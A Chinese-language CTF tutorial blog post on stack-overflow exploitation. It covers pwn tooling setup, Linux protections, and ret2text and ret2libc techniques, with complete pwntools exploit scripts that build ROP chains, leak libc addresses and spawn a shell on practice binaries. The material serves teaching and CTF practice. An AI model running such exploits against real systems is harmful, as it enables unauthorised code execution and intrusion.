---
title: PWN入门——栈溢出
published: 2024-12-27 10:57
tags: [安全, PWN, 栈溢出, ROP, CTF]
category: CTF
draft: false
---

# PWN入门——栈溢出

## 0x00 pwn环境配置

### 更新、安装vim

```bash
sudo apt upgrade
sudo apt install vim
```

### 安装必要环境

```
将一下内容写入一个sh脚本文件中，为chmod 777 xxx.sh文件赋权限后直接./xxx.sh运行脚本，中途会出现Do you want to continue? [Y/n]输入y
```

```bash
#!/bin/bash
cd ~
sudo apt install tzdata
sudo apt install vim
sudo apt install libxml2-dev
sudo apt install libxslt-dev
sudo apt install libmysqlclient-dev
sudo apt install libsqlite3-dev
sudo apt install zlib1g-dev
sudo apt install python2-dev
sudo apt install python3-pip
sudo apt install libffi-dev
sudo apt install libssl-dev
sudo apt install wget
sudo apt install curl
sudo apt install gcc
sudo apt install clang
sudo apt install make
sudo apt install zip
sudo apt install build-essential
sudo apt install libncursesw5-dev libgdbm-dev libc6-dev
sudo apt install tk-dev
sudo apt install openssl
sudo apt install virtualenv
sudo apt install git
sudo apt install proxychains4
sudo apt install ruby-dev

#setuptools 36.6.1 -> python2
wget https://mirrors.aliyun.com/pypi/packages/56/a0/4dfcc515b1b993286a64b9ab62562f09e6ed2d09288909aee1efdb9dde16/setuptools-36.6.1.zip
unzip setuptools-36.6.1.zip
cd setuptools-36.6.1
sudo python2 setup.py install
cd ../
sudo rm -rf setuptools-36.6.1 setuptools-36.6.1.zip

#setuptools 65.4.1 -> python3
wget https://mirrors.aliyun.com/pypi/packages/03/c9/7b050ea4cc4144d0328f15e0b43c839e759c6c639370a3b932ecf4c6358f/setuptools-65.4.1.tar.gz
tar -zxvf setuptools-65.4.1.tar.gz
cd setuptools-65.4.1
sudo python3 setup.py install
cd ../
sudo rm -rf setuptools-65.4.1 setuptools-65.4.1.tar.gz

#pip
wget https://mirrors.aliyun.com/pypi/packages/53/7f/55721ad0501a9076dbc354cc8c63ffc2d6f1ef360f49ad0fbcce19d68538/pip-20.3.4.tar.gz
tar -zxvf pip-20.3.4.tar.gz
cd pip-20.3.4
sudo python2 setup.py install
sudo python3 setup.py install
cd ../
sudo rm -rf pip-20.3.4 pip-20.3.4.tar.gz

sudo pip2 config set global.index-url https://mirrors.aliyun.com/pypi/simple
sudo pip3 config set global.index-url https://mirrors.aliyun.com/pypi/simple

sudo python2 -m pip install --upgrade pip
sudo python3 -m pip install --upgrade pip

pip3 install --upgrade pip
sudo pip2 install pathlib2
```

### pwntools

```bash
sudo python2 -m pip install --upgrade pwntools
sudo python3 -m pip install --upgrade pwntools
```

### pwndbg+Pwngdb

```
这里我直接去github下载运行setup.sh会报错要求升级python3，所以直接把原来虚拟机里的打包复制过来了

pwnenv.zip
```

```bash
unzip pwnenv.zip
rm pwnenv.zip

#pwndbg
cd pwndbg
./setup.sh

#Pwngdb
cd ~/
cp ~/Pwngdb/.gdbinit ~/

vim ~/.gdbinit
#注释掉第一行 然后在第二行写入
source ~/pwndbg/gdbinit.py
```

### patchelf

```bash
sudo apt install patchelf
```

### glibc-all-in-one

```bash
#glibc-all-in-one
git clone https://github.com/matrix1001/glibc-all-in-one.git
cd glibc-all-in-one
python3 update_list
cat list
```

### ropper

```bash
sudo pip3 install capstone filebytes unicorn keystone-engine ropper
```

### qemu-system

```bash
sudo apt-get install qemu-system
```

### Ropgadget

```bash
sudo -H python3 -m pip install ROPgadget
```

### one_gadget、seccomp-tools

这两个我感觉很随缘，没事运行一下看运气吧（

```bash
sudo gem install one_gadget
sudo gem install seccomp-tools
```

## 0x01 基础知识 & ret2text

### PWN解题目标

获取远程靶机里的`flag`文件中的字符串（`flag`是**动态**的，每个队伍的`flag`不同）

- 获取`shell`：和远程终端交互通过`cat flag`获取

  可以获取`shell`的函数：**`system('/bin/sh')`** `system('sh')` `system('$0')`

  ps:读的是远程的`flag`文件，本地可以用`ls`确认是否获得`shell`或创建一个`flag`文件

- 读取`flag`（`open read write`）/ `system('cat flag')`

### 前置基础

示例代码

```c
#include <stdio.h>

char hello[] = "Hello world!";
int buf[10];

int func(int a, int b){
        int res;
        res = a + b;
        return res;
}

int main(){
        int a, b, c;
        a = 10;
        b = 20;
        c = func(a, b);
        printf("Result is: %d", c);
        return 0;
}
```

### 修复建议

```
1、对所有用户输入进行边界检查，确保写入缓冲区的数据不会超出其容量。
2、使用安全的替代函数
```

| 不安全函数                            | 安全函数                                                     | 说明                                                         |
| :------------------------------------ | :----------------------------------------------------------- | :----------------------------------------------------------- |
| `gets(char *str)`                     | **`fgets(char \*str, int size, FILE \*stream)`**             | `fgets` 会读取最多 `size-1` 个字符，并在末尾添加 `\0`。用 `stdin` 作为流参数。 |
| `strcpy(char *dest, const char *src)` | **`strncpy(char \*dest, const char \*src, size_t n)`**       | 拷贝最多 `n` 个字符。**注意**：如果 `src` 前 `n` 个字符没有 `\0`，则 `dest` 不会以 `\0` 结尾，需要手动处理。 |
| `strcat(char *dest, const char *src)` | **`strncat(char \*dest, const char \*src, size_t n)`**       | 相对安全，它会自动在末尾添加 `\0`，但需确保 `dest` 有足够空间容纳 `n+1` 个新字符。 |
| `sprintf(char *str, ...)`             | **`snprintf(char \*str, size_t size, const char \*format, ...)`** | 最多写入 `size-1` 个字符，并保证以 `\0` 结尾。这是最推荐的格式化输出函数。 |

#### 工具使用

##### nc

在终端直接与远程程序交互：`nc ip port`

##### IDA

参考文章：https://www.cnblogs.com/ve1kcon/p/17812418.html

| 快捷键 | 作用                                                     |
| :----- | :------------------------------------------------------- |
| n      | 重命名变量/函数                                          |
| y      | 修改函数原型或者变量类型                                 |
| tab    | 在反汇编窗口中，进行**汇编指令**与**伪代码**之间的切换   |
| esc    | 翻页，返回前一页面                                       |
| space  | 在反汇编窗口中，进行**列表视图**与**图形视图**之间的切换 |
| f12    | 打开字符串窗口，可用于字符串搜索                         |
| /      | 添加注释                                                 |

##### gdb

参考文章：https://www.cnblogs.com/ve1kcon/p/17812420.html

| 指令                                           | 作用                                                         |
| :--------------------------------------------- | :----------------------------------------------------------- |
| gdb filename                                   | 进入调试可执行程序                                           |
| r                                              | 开始/重新运行程序                                            |
| c                                              | 运行到断点/结束                                              |
| q                                              | 退出                                                         |
| n                                              | 单步调试                                                     |
| s                                              | 单步调试并跟进函数                                           |
| p/x                                            | 用于计算（相当于计算器）                                     |
| vmmap                                          | 获取调试进程中的虚拟映射地址范围                             |
| x/gx x/gi x/gs                                 | 以数据 / 汇编 / 字符串的形式查看内存（x/20gx一次查看更多数据） |
| b *address / function_name / *$rebase(address) | 绝对地址 / 函数名 / 相对地址下断点                           |
| fin                                            | 跳出当前函数，执行到函数返回处                               |
| context                                        | 重新打印页面信息                                             |
| code                                           | 查看程序基址                                                 |
| libc                                           | 查看libc基址                                                 |

##### checksec

`checksec filename` 查看架构、端序、保护

#### elf文件格式

- `.init、.fini`：保存了进程初始化和结束所用的代码，这两个节通常都是由编译器自动添加

- `plt、got`：动态链接的跳转和全局入口表

- `.text`：代码段

- `.rodata`：保存了只读数据，可以读取但不能修改

  例如示例代码中的`"Result is: %d"`

- `.data`：已初始化的全局变量和局部静态变量都保存在`.data`段

  例如示例代码中的`"Hello world!"`

- `.bss`：未初始化的全局变量和局部静态变量默认值都为`0`

  `.bss`段只是为未初始化的全局变量和局部静态变量预留位置没有内容，所以它在文件中也不占据空间

  例如示例代码中的`buf`

#### 函数调用过程

##### 栈

指数据**暂时存储**的地方，所以才有入栈、出栈的说法，入栈和出栈都在栈顶（即将数据存放到数据暂存区的顶部以及从顶部取出数据），局部非静态变量存储在栈中

##### 寄存器

###### 64位

一个地址占`8`字节，可以使用`pwntools`的`p64`生成一个`64`位的地址

**栈**：`rbp` -> 栈底 `rsp` -> 栈顶

**当前执行指令寄存器**：`rip`

**传参**：`rdi` -> 一参 `rsi` -> 二参 `rdx` -> 三参

###### 32位

一个地址占`4`字节，可以使用`pwntools`的`p32`生成一个`32`位的地址

**栈**：`ebp`：栈底 `esp`：栈顶

**当前执行指令寄存器**：`eip`

**传参**：通过栈传参

##### 函数调用

![](/images/posts/stack-overflow/1.png)

#### linux保护机制

- `ASLR：Address Space Layout Randomization`

  `linux`地址随机化，程序运行时的堆栈以及共享库的加载地址随机化

  关闭`ASLR`:`sudo sysctl -w kernel.randomize_va_space=0`

- `RELRO：RELocation Read-Only`

  1. `Full RELRO`：`got`表不可写

  2. `Partial RELRO`

     ```none
     gcc编译时关闭relro参数：
     -z norelro	完全关闭
     -z lazy		部分开启
     -z now		完全开启
     ```

- `stack`

  `canary`，防止栈溢出，位于`rbp - 0x8`

  ```none
  gcc编译时关闭canary参数：
  -fno-stack-protector
  ```

- `NX：Non-eXecute`

  1. `NX enable`：堆栈不可执行，仅`.text`段可执行

  2. `No NX`

     ```none
     gcc编译时关闭NX参数：
     -z execstack	允许在堆栈上执行代码
     -z noexecstack	禁止在堆栈上执行代码
     ```

- `PIE`

  gcc编译，code，获取地址，下断点

  1. `PIE enabled`：程序地址随机化

  2. `No PIE`

     ```none
     gcc编译时关闭PIE参数：
     -no-pie
     ```

### ret2text

即返回到`text`段，劫持返回地址到后门（即覆盖`ret`为后门的地址）

#### 原理

输入长度没有被限制导致覆盖到`ret`

例如：`gets`函数不限制输入长度

#### 解题

- 检查保护（确认`no pie`以及`no canary`）
- 确定后门地址、变量到栈底的距离（根据`IDA`中变量后的`rbp-xx`得到与栈底的距离为`xx`）
- 填充中间空间（变量到栈底的距离+`rbp`的长度）并覆盖`ret`为返回地址

#### 交互脚本模板

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './filename'	#修改成可执行文件名

debug = 0	#打远程时改成1
if debug:
    r = remote('ip', port)	#打远程时修改ip和端口
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)	#在需要调试的地方加上dbg()

r.interactive()
```

#### 例题：pwn

```bash
# 到rbp的偏移为0x70，/bin/sh字符串地址为0x004007B8
# 传入b'a' * 0x70 + b'b' * 0x8能够看到覆盖到ret，后面直接追加字符串地址
```

exp：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './pwn'

li = lambda x : print('\x1b[01;38;5;214m]' + str(x) + '\x1b[0m')
li = lambda x : print('\x1b[01;38;5;1m]' + str(x) + '\x1b[0m')

context.terminal = ['tmux', 'splitw', '-h']

debug = 0
if debug:
    r = remote('ip', port)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

def get_libc():
    return u64(r.recvuntil(b'\x7f'))[-6:].ljust(8, b'\x00')

binsh = 0x004007B8
payload = b'a' * 0x70 + b'b' * 0x8 + p64(binsh)

dbg()

r.sendline(payload)

r.interactive()
```

#### 确定栈空间

```
gdb ./ret2text

pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

确定无效地址：
Invalid address 0x62616164

pwndbg> cyclic -l 0x62616164
Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
Found at offset 112
pwndbg> p 0x64+0xc
$1 = 112
```

## 0x02 ret2libc

### 前置基础

#### 相关概念

`gadget`：程序本身或者`libc`中存在的一些汇编指令，每一条指令有其对应的地址，将这些`gadget`地址部署到栈中可以执行该地址中存放的汇编指令

 例如：`ret2text`就是执行程序本身有的`system("/bin/sh");`指令

`ROP`：一种利用现有程序中的代码片段（即`gadget`）来构造攻击的技术，通过构造一系列的`gadget`来实现攻击目标，也可以控制程序执行好几段不相邻的程序已有的代码

 例如：在返回地址处按顺序填上函数`func1`、`func2`、`func3`的地址就会依次执行这三个函数，更多的是利用其中的汇编指令

#### 工具指令

##### ROPgadget

获取`gadget`地址，`--binary`参数指定文件，可以是可执行文件或`libc`文件，`grep`用于筛选，`--string`用于筛选字符串

通过`pop rdi`可以将栈地址中的值传递给`rdi`寄存器，其他寄存器也同理，所以在构造`ROP`链时直接使用`p64(pop_rdi_ret) + p64(rdi_content)`即可控制`rdi`寄存器的值为`rdi_content`

```bash
$ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi'	#控制寄存器的值
$ROPgadget --binary ./pwn --string '/bin/sh'	#查找字符串
$ROPgadget --binary ./libc-2.35.so --only 'leave|ret' | grep 'leave'	#查找leave ret指令地址
$ROPgadget --binary ./pwn --ropchain	#生成现成的rop利用链直接getshell，适用于静态编译的程序
$ROPgadget --binary ./pwn --only 'ret'	#查找ret指令的地址
```

##### string

```bash
$strings ./libc.so.6  | grep GNU	#获取libc版本
```

##### glibc-all-in-one

进入`glibc-all-in-one`文件夹下执行`./update_list`之后`cat list`确认是否有对应版本的`libc`，存在对应版本使用`./download libc版本名`进行下载，下载完成之后存在于`libs`文件夹下，需要用的时候将文件夹下的`libc`文件夹复制过去，下载失败可以直接复制下载地址到`windows`中下载再放到虚拟机里

**示例**

使用`strings`指令确定`libc`版本为`2.38-1ubuntu6`，使用`file`指令确定`32`位（也可以`checksec ./pwn`）

```bash
$strings ./libc.so.6  | grep GNU 
GNU C Library (Ubuntu GLIBC 2.38-1ubuntu6) stable release version 2.38.
Compiled by GNU CC version 13.2.0.

$file libc.so.6 
libc.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=495fc00b597566b5e14e221f563afe29ec1d8478, for GNU/Linux 3.2.0, stripped
```

确认`list`列表中存在该版本的`libc`

```bash
$cat list    
2.23-0ubuntu11.3_amd64
2.23-0ubuntu11.3_i386
2.23-0ubuntu3_amd64
2.23-0ubuntu3_i386
2.27-3ubuntu1.5_amd64
2.27-3ubuntu1.5_i386
2.27-3ubuntu1.6_amd64
2.27-3ubuntu1.6_i386
2.27-3ubuntu1_amd64
2.27-3ubuntu1_i386
2.31-0ubuntu9.12_amd64
2.31-0ubuntu9.12_i386
2.31-0ubuntu9.7_amd64
2.31-0ubuntu9.7_i386
2.31-0ubuntu9_amd64
2.31-0ubuntu9_i386
2.35-0ubuntu3.4_amd64
2.35-0ubuntu3.4_i386
2.35-0ubuntu3_amd64
2.35-0ubuntu3_i386
2.37-0ubuntu2.1_amd64
2.37-0ubuntu2.1_i386
2.37-0ubuntu2_amd64
2.37-0ubuntu2_i386
2.38-1ubuntu6_amd64
2.38-1ubuntu6_i386
```

下载该版本的`libc`，如果下载失败可以直接复制里面的链接`https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_i386.deb`在`windows`里下载再存到虚拟机里，下载完成后位于`libs`文件夹中，需要使用时直接`cp -r ~/glibc-all-in-one/libs/2.38-1ubuntu6_i386 ./2.38`复制文件夹使用

```bash
$./download 2.38-1ubuntu6_i386                   
Getting 2.38-1ubuntu6_i386
  -> Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_i386.deb
  -> Downloading libc binary package
  -> Extracting libc binary package
x - debian-binary
x - control.tar.zst
x - data.tar.zst
/home/starrysky/glibc-all-in-one
  -> Package saved to libs/2.38-1ubuntu6_i386
  -> Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.38-1ubuntu6_i386.deb
  -> Downloading libc debug package
  -> Extracting libc debug package
x - debian-binary
x - control.tar.zst
x - data.tar.zst
/home/starrysky/glibc-all-in-one
  -> Package saved to libs/2.38-1ubuntu6_i386/.debug
```

##### ldd

获取可执行文件的动态链接文件，包括`ld`和`libc`等

```bash
$ldd ./pwn
```

##### patchelf

更改可执行文件的动态链接文件，更改`ld`可以直接指定`ld`文件，而更改`libc`需要先使用`ldd`查看原`libc`作为`--replace-needed`选项的第一个参数，一般默认是`libc.so.6`

**libc和ld要同时更改确保在同一版本**

```bash
$patchelf --replace-needed libc.so.6 ./2.38/libc.so.6 ./pwn		#更改libc
$patchelf --set-interpreter ./2.35/ld-linux-x86-64.so.2 ./pwn	#更改ld
```

##### onegadget

能直接`getshell`的`gadget`，添加参数`-l2`可以获得更多

```bash
$one_gadget ./libc.so.6
```

#### 延迟绑定

参考文章：https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/

延迟绑定是一种在程序运行时才解析**外部符号**（如函数和变量）地址的技术，它允许程序在启动时不必立即加载所有动态链接库中的符号，从而提高程序的启动速度

`c`语言内置的函数(例如`printf`）都是依赖于`libc`中的外部函数

##### 动态链接与静态链接

**动态链接**是指在程序运行时才将程序与所需的动态链接库中的库函数链接起来的过程，动态链接的程序在启动时会加载所需的动态库（例如`libc`），并在运行时解析外部符号的地址

**静态链接**在编译时将所有需要的库函数直接复制到可执行文件中，生成的可执行文件不依赖于外部的库文件，可以独立运行，但是会导致可执行文件体积增大

##### plt与got

**PLT（Procedure Linkage Table）** 是一个代码段，包含了用于动态链接的跳转指令。每个需要动态链接的外部函数都会在`PLT`中有一个条目，当程序第一次调用这个函数时，`PLT`中的代码会被执行，这个代码会去查找并解析外部函数的实际地址，并将其存储在`GOT`中，以便后续调用时直接跳转到正确的地址

**GOT（Global Offset Table）** 是一个数据段，存储了所有外部符号的地址。在程序启动时，`GOT`中的条目可能并不包含最终的地址，而是包含指向`PLT`中相应条目的指针。当`PLT`条目第一次被执行时，会将查找到的外部符号地址更新到`GOT`中，这样后续的调用就可以直接通过`GOT`找到正确的地址

##### 延迟绑定过程

1. **程序启动**：程序启动时，动态链接器加载程序和所有依赖的动态库
2. **符号解析**：当程序第一次调用一个外部函数时，`PLT`中的代码会被执行，查找并解析外部函数的实际地址
3. **地址存储**：查找到的地址被存储在`GOT`中，以便后续调用
4. **直接调用**：后续对同一外部函数的调用将直接通过`GOT`进行，无需再次解析

##### 总结

- 执行函数的`plt`会通过跳转`got`直接调用到该函数
- `got`表可写的情况下覆盖函数的`got`表为其他函数地址可以实现调用该函数时执行到其他函数

### ret2libc

目标是执行`system("/bin/sh");`，即执行`system`函数其一参为`"/bin/sh"`

#### 有system和/bin/sh

延迟绑定部分提到，执行函数的`plt`可以直接调用到该函数，那么构造`rop`链就是要先控制一参`rdi`为`"/bin/sh"`的地址再填`system`的`plt`

- 控制一参

  使用`ROPgadget`找到`pop rdi`的地址

  ```bash
  $ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi'
  ```

  ps：`gadget`中含有`pop rdi`就行，但是有`pop`其他寄存器就需要在后面加上对应的值，例如`0x000ac112 : pop rdi ; pop rbx ; ret`，`pop rdi`之后还`pop rbx`，所以后面需要加两个地址，即`p64(0x000ac112) + p64(rdi_content) + p64(rbx_content)`，后面就可以继续加其他`gadget`

- 找`"/bin/sh"`地址

  `"/bin/sh"`地址需要在`IDA`中查找，直接按`f12`找到对应地址

- 找`system`函数地址

  `pwntools`中可以直接获取`plt`和`got`的地址：`elf.plt['system']` `elf.got['system']`

最终构造出

```python
#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret
pop_rdi_ret = 
bin_sh = IDA中/bin/sh地址
system_plt = elf.plt['system']
p = b'a' * ? + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_plt)
r.sendline(p)
```

##### 例题ret2libc1

```bash
ida中看到的主函数距离栈低还有0x64的偏移，但真实情况需要通过gdb和pwndbg进行调试，发现还需要0xc的距离，之后通过32位栈的传参方式进行传参，system->p32(0)->/bin/sh，因为system之后不需要执行任何代码，所以给占位符0
```

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './ret2libc1'

li = lambda x : print('\x1b[01;38;5;214m]' + str(x) + '\x1b[0m')
li = lambda x : print('\x1b[01;38;5;1m]' + str(x) + '\x1b[0m')

context.terminal = ['tmux', 'splitw', '-h']

debug = 0
if debug:
    r = remote('ip', port)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

#def get_libc():
#    return u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

system_addr = elf.plt['system']
binsh_addr = 0x08048720
#payload = b'a' * 0x64 + b'b' * 0xc + b'c' * 0x4
payload = b'a' * 0x64 + b'b' * 0xc + p32(system_addr) + p32(0) + p32(binsh_addr)

#dbg()

r.sendline(payload)
r.interactive()
```

#### 有system无/bin/sh

缺少`/bin/sh`可以直接往程序中的一个地址写入`/bin/sh`，假设地址是`buf`，那么就要先构造`gets(buf)`，读取`/bin/sh`之后再执行`system('/bin/sh')`，其中`system`的一参就说`buf`，即`/bin/sh`的地址

- 获取`gets`的`plt`地址：`elf.plt['gets']`
- 设置`buf`的地址，从`IDA`中选取，可以从`bss`段中选取地址
- 获取`system`的`plt`地址：`elf.plt['system']`
- 设置一参：`ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi'`

最终构造：注意发送`/bin/sh`最后加上`\x00`截断字符串，在执行`rop`链的过程中会执行`gets(buf)`从输入流输入`buf`的值，此时输入`/bin/sh\x00`即可向`buf`输入字符串

```python
#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret
pop_rdi_ret = 
buf = 
gets_plt = elf.plt['gets']
system_plt = elf.plt['system']
p = b'a' * ?
p += p64(pop_rdi_ret) + p64(buf) + p64(gets_plt)	#gets(buf)
p += p64(pop_rdi_ret) + p64(buf) + p64(system_plt)	#system(buf)
r.sendline(p)
r.sendline('/bin/sh\x00')
```

##### 例题ret2libc2

```bash
由于没有/bin/sh字符串，所以通过写入函数先将字符串写入bss段，然后进行调用，ida分析到bss的空间地址，获取plt表中的system和gets函数地址，按照栈空间的顺序进行函数调用
```

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './ret2libc2'

li = lambda x : print('\x1b[01;38;5;214m]' + str(x) + '\x1b[0m')
li = lambda x : print('\x1b[01;38;5;1m]' + str(x) + '\x1b[0m')

context.terminal = ['tmux', 'splitw', '-h']

debug = 0
if debug:
    r = remote('ip', port)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

#def get_libc():
#    return u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

system_addr = elf.plt['system']
gets_addr = elf.plt['gets']
bss_buf = 0x0804A080
payload = b'a' * 0x64 + b'b' * 0xc
payload += p32(gets_addr) + p32(system_addr) + p32(bss_buf) * 2

#dbg()

r.sendline(payload)
r.sendline('/bin/sh\00')
r.interactive()
```

#### 无system无/bin/sh

可执行文件中没有`system`，但是作为动态链接库的`libc`中有，所以直接执行`libc`中的`system`即可，所以思路就是先获取`libc`的基址，再计算`libc`中`system`和`/bin/sh`的地址，最后执行`system('/bin/sh')`

`got`部分提到`got`表存放了外部符号地址，即`libc`中的地址，所以如果能够泄露`got`表中的地址就能获取`libc`中某个函数的真实地址，再减去这个函数在`libc`中的偏移就能得到`libc`的基址，最后加上`system`函数的偏移就能得到`system`函数的地址

- 泄露`got`表中函数的地址

  需要用一个输出函数输出一个`got`表的地址，一般构造`puts(puts_got)`，最后还要再回到该函数继续利用栈溢出，即`p64(pop_rdi_ret) + p64(puts_got) + p64(puts) + p64(main)`

  接收该地址：基本就是一个固定用法`u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))`

- 获取`libc`基址

  标志：64位以`7f`开头，基址末尾三位是0

  已知`puts`函数的真实地址和`puts`函数的偏移，`libc`的基址就等于真实地址减偏移

  获取`puts`函数在`libc`中的偏移可以通过`libc = ELF('libc文件')`，然后`libc.sym['puts']`得到`puts`偏移

  在打本地的时候如果修改了`libc`版本需要对应修改`ELF`里的文件路径，也可以直接在本地打通之后修改文件路径为远程的`libc`文件后直接打远程

- 获取`system`和`/bin/sh`地址：从`libc`获取地址需要**加上基址**

  `system = libc.sym['system'] + libc_base`

  `bin_sh = libc.search(b'/bin/sh\x00').__next__() + libc_base`

最终构造：

```python
#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret
pop_rdi_ret = 
main = elf.sym['main']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
p = b'a' * ? + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
r.sendline(p)

libc = ELF('libc文件路径')
libc_base = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
system = libc.sym['system'] + libc_base
bin_sh = libc.search(b'/bin/sh\x00').__next__() + libc_base
p = b'a' * ? + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
r.sendline(p)
```

##### 例题ret2libc3

```bash
1、通过ELF函数获取puts和__libc_start_main的地址，通过put函数打印，获取之后在libc.rip网站中查询对应的offset
2、在libc中的地址减去libc的offset即可获得基址，通过对应的system和/bin/sh的地址offset加上基址即可获得函数和字符串地址
3、最后getshell需要在system函数后加上返回地址，这里写的是4个字节，也可以p32(0)，在某些情况下，返回地址的具体值并不重要，只要 system 函数能够正确执行即可
```

```python
from pwn import *

sh = process("./ret2libc3")

ret2libc3 = ELF("./ret2libc3")

puts_plt = ret2libc3.plt['puts']
libc_start_main = ret2libc3.got['__libc_start_main']
start = ret2libc3.symbols['_start']
puts_got= ret2libc3.got['puts']

sh.sendlineafter('Can you find it !?',flat(['a'*112,puts_plt, start, puts_got]))
put_addr = u32(sh.recv()[0:4])
print (f"put_addr is "+hex(put_addr))

sh.sendline(flat(['a'*112, puts_plt, start, libc_start_main]))
libc_start_main_addr = u32(sh.recv()[0:4])
print (f"libc_start_main_addr is "+hex(libc_start_main_addr))

puts_libc = 0x732a0
sys_libc = 0x48170
binsh_libc = 0x1bd0d5

libc_base = put_addr - puts_libc
system_addr = libc_base + sys_libc
binsh_addr =  libc_base + binsh_libc

#sh.sendline(flat(['a'*112, system_addr, 'b'*4, binsh_addr]))
sh.sendline(b'a'*112+p32(system_addr)+b'b'*4+p32(binsh_addr))
sh.interactive()
```

##### 例题level3_x64

```bash
1、虽然没有system函数和/bin/sh字符串，可以通过引用的动态链接库libc.so.6进行操作，通过前面的命令查看引用的版本为2.35
2、每传参一次进行调试，查看是否将返回地址覆盖，长度为0x88正好将前面的地址进行覆盖，之后构造ROP链
3、要利用主函数的write函数，其用法为write(1, write_got, ?)，利用找到的rdi和rsi的地址，按照调用顺序将地址覆盖，第一个参数是1则传入p64(1)，第二个参数是输入的内容，由于找到的rsi的ret代码中存在两条指令，所以要将r15寄存器跳过，这里通过传入p64(0)将其过掉
4、想要调用write函数，则需要知道write的真实地址，所以通过elf的got函数和plt函数进行获取真实地址，顺序是got->plt，最后返回到main函数用于下一步的传参
5、为了获取system函数，需要获取libc的基址，所以通过write函数的真实地址减去write函数的偏移量就得到了基址，通过libc基址+system函数的偏移量就得到了system函数的真实地址
6、获取/bin/sh字符串通过libc的search函数进行搜索，加上libc基址就得到了/bin/sh字符串的真实地址
7、之后由于上面的payload返回到了main函数，就需要再次传入payload，和例题一一样，传入pop_rdi地址，然后是/bin/sh字符串，最后是system函数的真实地址
```

**一个寄存器只能传一个参，在调用下一个寄存器时，要把上一个寄存器的参传进去，在这个64位程序里先传参再传函数。然后参数要一个一个放。**

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './level3_x64'

#li = lambda x : print('\x1b[01;38;5;214m]' + str(x) + '\x1b[0m')
li = lambda x : print('\x1b[01;38;5;1m]' + str(x) + '\x1b[0m')

context.terminal = ['tmux', 'splitw', '-h']

debug = 0
if debug:
    r = remote('127.0.0.1', 1234)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

#def get_libc():
#    return u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

#0x00000000004006b3 : pop rdi ; ret
#0x00000000004006b1 : pop rsi ; pop r15 ; ret
pop_rdi = 0x00000000004006b3
pop_rsi_r15 = 0x00000000004006b1
write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']

#payload = b'a' * (0x80 + 0x8) + b'b' * 0x8
payload = b'a' * (0x80 + 0x8) 

#write(1, write_got, ?)
#payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(write_plt) * 2 + p64(main)
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(main)
#r.sendline(payload)
r.sendafter("Input:\n", payload)
#write_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
write_addr = u64(r.recv(8))

libc = ELF('./2.35/libc.so.6')
libc_base = write_addr - libc.sym['write']
system = libc.sym['system'] + libc_base
bin_sh = libc.search(b'/bin/sh\x00').__next__() + libc_base

payload = b'a' * (0x80 + 0x8)
payload += p64(pop_rdi) + p64(bin_sh) + p64(system)

#dbg()

r.sendline(payload)
r.interactive()
```

#### 堆栈平衡

某些指令，如`movaps`（用于操作`XMM`寄存器），要求栈指针`RSP`必须是`16`字节对齐的，直接从返回地址开始写`rop`链可能会造成堆栈不平衡，需要在`rop`链前加上汇编指令`ret`平衡堆栈

```bash
$ROPgadget --binary ./pwn --only 'ret'	#查找ret指令的地址
```

#### 32位程序

32位和64位的区别就是32位通过栈传参而不通过寄存器传参，所以不像64位需要找`pop rdi`的值，32位构造`rop`链的方式是函数+返回地址+参数列表，例如

```python
p = b'a' * ?
p += p64(pop_rdi_ret) + p64(buf) + p64(gets)	#gets(buf)
p += p64(pop_rdi_ret) + p64(buf) + p64(system)	#system(buf)
```

对应32位的程序

```python
p = b'a' * (0x64 + 0xc) + p32(gets_plt) + p32(system_plt) + p32(bss) * 2
```

### 补充

